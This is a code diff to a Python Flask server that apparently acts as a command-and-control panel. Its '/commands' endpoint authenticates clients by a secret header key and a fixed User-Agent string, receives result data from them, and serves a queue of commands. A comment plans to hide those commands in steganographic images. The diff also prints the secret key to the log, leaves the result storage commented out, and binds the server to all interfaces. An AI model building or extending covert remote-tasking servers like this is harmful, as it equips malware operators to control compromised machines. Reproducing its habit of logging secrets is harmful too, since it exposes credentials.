@@ -131,25 +131,29 @@ def register():
 # NOTE WE WILL PROBABLY HAVE TO CHANGE THE SQL DATABASE WITH THIS, TOO
 
 
-@app.route('/commands')
+@app.route('/commands', methods=['GET', 'POST'])
 def getCommand():
-    secretKey = request.args.get('Authorization')
-    guid = request.args.get('guid')
+    print("---------------------SECRET KEY-------------------")
+    secretKey = request.headers.get('Authorization')
+    print("---------------------PASS = " + secretKey + "-------------------")
+    # guid = request.args.get('guid')
     if secretKey == password:
+        print("---------------------User-Agent-------------------")
         userAgent = request.headers.get('User-Agent')
         if userAgent == "Myles920":
-            result = request.data()
-            result_data = base64.b64decode(result).decode('utf-8')
+            print("---------------------DATA REQUEST-------------------")
+            result = request.data
+            # result_data = base64.b64decode(result).decode('utf-8')
 
-            new_results = Results(results=result_data)
-            db.add(new_results)
+            # new_results = Results(results=result_data)
+            # db.add(new_results)
             # TODO CHANGE THE 'DONE' STATUS OF THE COMMAND TO TRUE, SINCE WE RECEIVED THE RESPONSE
 
-            db.session.commit()
+            # db.session.commit()
         task_queue = Command.query.all()
         # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
 
-        return render_template('commands.html', task_queue=task_queue)
+        return render_template('simple_commands.html', task_queue=task_queue)
     else:
         return render_template('redir.html')
 
@@ -230,5 +234,5 @@ def unauthorized_handler():
 
 if __name__ == '__main__':
     main()
-    app.run(debug=False)
+    app.run(host="0.0.0.0", debug=False)
     db.create_all()
